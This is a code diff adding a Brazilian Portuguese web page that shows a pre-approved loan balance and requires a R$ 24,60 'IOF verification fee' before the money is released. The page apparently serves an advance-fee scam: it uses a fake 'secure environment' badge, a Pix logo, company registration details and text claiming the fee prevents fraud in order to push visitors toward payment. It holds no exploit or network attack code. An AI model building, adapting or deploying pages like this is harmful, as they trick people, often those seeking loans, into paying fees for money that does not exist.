@@ -1,0 +1,124 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação pendente IOF</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="..https://www.google.com/?hl=pt-BR"></script>
+</head>
+
+    
+<body>
+
+
+    <nav class="navbar">
+        <div class="container">
+            <div class="logo-container">
+               <img src="images/logo.png" alt="Logo" class="img-fluid w-50 img-branca" data-pagespeed-url-hash="4025366407">
+            </div>
+        </div>
+    </nav>
+
+
+    <!--BOX VIDEO, timeline...-->
+    <div class="card border border-secondary shadow p-4 my-4 mx-3 mx-md-4">
+
+      <div class="d-flex justify-content-center align-items-center">
+        <div class="card border border-secondary shadow p-4 mb-4">
+          <div id="limiteDisponivel" class="text-center">
+            <h5><strong>Limite disponível:</strong></h5>
+            <h4 class="text-success"><strong>R$ 0,00</strong></h4>
+        </div>        
+        </div>
+      </div>
+
+
+      <div class="justify-content-center align-items-center text-center mb-4">
+        <h3>Saldo disponível até o dia:</h3>
+        <h4 style="color:#003399;" id="descounttime"></h4>
+      </div>
+
+
+      <div class="d-flex justify-content-center align-items-center">
+        <div class="card border border-secondary border-dashed shadow p-4 mb-4">
+            <div class="text-center">
+                <h5><strong>Verificação de IOF</strong></h5>
+                <h4><strong>R$ 24,60</strong></h4>
+            </div>
+        </div>
+      </div>
+
+      <button class="btn btn-primary w-100 mb-3" onclick="redirect('up2')">
+          Efetuar verificação 
+       </button>"
+
+      <div class="d-flex align-items-center justify-content-center gap-2 text-muted small mb-4">
+        <svg xmlns="http://www.google.com/?hl=pt-BR" width="16" height="16" viewBox="0 0 256 256">
+            <path fill="#3db1a5" d="M216 56v56c0 96-88 120-88 120s-88-24-88-120V56a8 8 0 0 1 8-8h160a8 8 0 0 1 8 8" opacity=".2"></path>
+            <path fill="#3db1a5" d="M208 40H48a16 16 0 0 0-16 16v56c0 52.72 25.52 84.67 46.93 102.19c23.06 18.86 46 25.26 47 25.53a8 8 0 0 0 4.2 0c1-.27 23.91-6.67 47-25.53C198.48 196.67 224 164.72 224 112V56a16 16 0 0 0-16-16m0 72c0 37.07-13.66 67.16-40.6 89.42a129.3 129.3 0 0 1-39.4 22.2a128.3 128.3 0 0 1-38.92-21.81C61.82 179.51 48 149.3 48 112V56h160Zm-70.34-18.34a8 8 0 0 0-11.32 0L120 148.69l-10.34-10.35a8 8 0 0 0-11.32 11.32l16 16a8 8 0 0 0 11.32 0l56-56a8 8 0 0 0-11.32-11.32Z"></path>
+        </svg>
+        Ambiente seguro
+      </div>
+
+
+      <div class="alert alert-dark" style="z-index: 1;">
+        <p>
+          Para receber o saldo disponível, é obrigatório efetuar o pagamento da taxa de verificação de usuário.<br>
+          Essa taxa cobre o custo de todos impostos IOF. Isso garante que o processo esteja em conformidade com as políticas agil e ajuda a evitar qualquer tipo de fraude ou golpe.
+        </p>
+      </div>
+
+      
+
+      <div class="text-center mb-3 pt-4">
+        <img src="images/pix-logo.svg" alt="Logo do Banco Central" class="d-block mx-auto" style="max-width: 180px;" data-pagespeed-url-hash="1731328160">
+      </div>
+
+    </div>
+    <!-- /conteudo do container do video-->
+
+
+
+
+    <!--FOOTER-->
+    <footer class="footer py-3 mt-4 border-top">
+    <div class="container">
+        <div class="row justify-content-center text-center text-md-start">
+        <div class="col-12 col-md-8">
+            <p class="mb-2">
+            © <span id="currentYear"></span> <span class="marca" style="text-transform: uppercase;"></span> S.A.<br>CNPJ: 60.779.196/0001-96<br>
+            <small class="d-block mt-2">
+                Avenida Presidente Wilson, 9<br>
+                São Vicente/SP - CEP 11320-905
+            </small>
+            </p>
+        </div>
+        </div>
+    </div>
+    </footer>
+    
+    <script language="javascript">var getdayNames=new Array("Domingo","Segunda-Feira","Terça-Feira","Quarta-Feira","Quinta-Feira","Sexta-Feira","Sábado");var getdayMonth=new Array("Janeiro","Fevereiro","Março","Abril","Maio","Junho","Julho","Agosto","Setembro","Outubro","Novembro","Dezembro");var getNow=new Date();var dayOfTheWeek=getNow.getDay();getNow.setTime(getNow.getTime()-0*24*60*60*1000);document.getElementById("descounttime").innerHTML=getNow.getDate()+" de "+getdayMonth[(getNow.getMonth())]+" de "+getNow.getFullYear();</script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    const valorSalvo = localStorage.getItem("valorEmprestimo");
+    const valorEmprestimo = valorSalvo ? Number(valorSalvo) : 4600;
+    const elemento = document.getElementById("limiteDisponivel");
+
+    if (elemento) {
+      elemento.innerHTML = `
+        <h5><strong>Limite disponível:</strong></h5>
+        <h4 class="text-success"><strong>R$ ${valorEmprestimo.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong></h4>
+      `;
+    }
+  });
+</script>
+
+    
+
+
+<script src="js/bootstrap.bundle.min.js"></script>
+<script src="js/links.js" defer=""></script>
+
+
+</body></html>
